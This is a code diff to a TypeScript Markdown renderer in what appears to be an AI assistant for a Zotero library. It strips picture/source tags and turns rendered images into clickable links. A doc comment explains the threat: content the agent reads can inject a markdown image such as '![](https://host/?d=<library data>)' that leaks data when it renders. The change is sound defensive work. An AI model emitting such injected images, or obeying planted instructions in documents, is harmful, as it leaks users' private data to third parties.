@@ -38,9 +38,13 @@ const citationDataAttributes = [
     'data-identity-attr', 'dataIdentityAttr',
 ];
 
+// `<picture>`/`<source>` would load a remote `srcSet`, which neither the
+// sanitizer's protocol check nor `urlTransform` covers. Images are replaced by
+// `rehypeImagesAsLinks`.
+const blockedTagNames = new Set(['picture', 'source']);
+
 // Create a custom schema that extends GitHub's defaults but allows normalized citation tags.
-const customSchema = deepmerge(defaultSchema, {
-    tagNames: [...(defaultSchema.tagNames || []), 'citation'],
+const mergedSchema = deepmerge(defaultSchema, {
     attributes: {
         ...defaultSchema.attributes,
         citation: citationDataAttributes
@@ -50,6 +54,14 @@ const customSchema = deepmerge(defaultSchema, {
         href: [...(defaultSchema.protocols?.href || []), 'zotero']
     }
 });
+// `deepmerge` concatenates arrays, so the tag list is replaced after the merge.
+const customSchema = {
+    ...mergedSchema,
+    tagNames: [
+        ...(defaultSchema.tagNames || []).filter((tagName) => !blockedTagNames.has(tagName)),
+        'citation',
+    ],
+};
 
 /**
  * Extract text content from a HAST node tree.
@@ -123,6 +135,43 @@ function transformMathNodes(node: any) {
 
 function hasProperty(node: any, name: string): boolean {
     return node?.type === 'element' && node.properties?.[name] !== undefined;
+}
+
+/**
+ * Rehype plugin that replaces every image with a link to it.
+ *
+ * Markdown comes from model output, which can be steered by untrusted content
+ * the agent reads (PDFs, web pages, shared notes). A remote image loads as soon
+ * as it renders, so an injected `![](https://host/?d=<library data>)` would
+ * send data to a third party without any user action. As a link, the URL is
+ * only fetched when the user clicks it. An image that is already inside a link
+ * becomes its label text, so the outer link stays the only destination.
+ * Exports apply the same rule, since notes load images too.
+ */
+function rehypeImagesAsLinks() {
+    return (tree: any) => {
+        replaceImages(tree, false);
+    };
+}
+
+function replaceImages(node: any, insideLink: boolean): void {
+    if (!node.children) return;
+    const childrenInsideLink = insideLink || (node.type === 'element' && node.tagName === 'a');
+    node.children = node.children.flatMap((child: any) => {
+        if (child.type !== 'element' || child.tagName !== 'img') {
+            replaceImages(child, childrenInsideLink);
+            return [child];
+        }
+        const { src, alt, title } = child.properties ?? {};
+        const href = typeof src === 'string' ? src : '';
+        const label = (typeof alt === 'string' && alt) || href;
+        if (!label) return [];
+        const text = { type: 'text', value: label };
+        if (childrenInsideLink || !href) return [text];
+        const properties: Record<string, unknown> = { href };
+        if (typeof title === 'string' && title) properties.title = title;
+        return [{ type: 'element', tagName: 'a', properties, children: [text] }];
+    });
 }
 
 /**
@@ -276,6 +325,7 @@ const MarkdownRenderer: React.FC<MarkdownRendererProps> = React.memo(function Ma
         const plugins: RehypePlugins = [
             rehypeRaw,
             [rehypeSanitize, customSchema],
+            rehypeImagesAsLinks,
             exportRendering ? rehypeZoteroMath : rehypeKatex,
         ];
         if (exportRendering) plugins.push(rehypeZoteroNoteFootnotes);
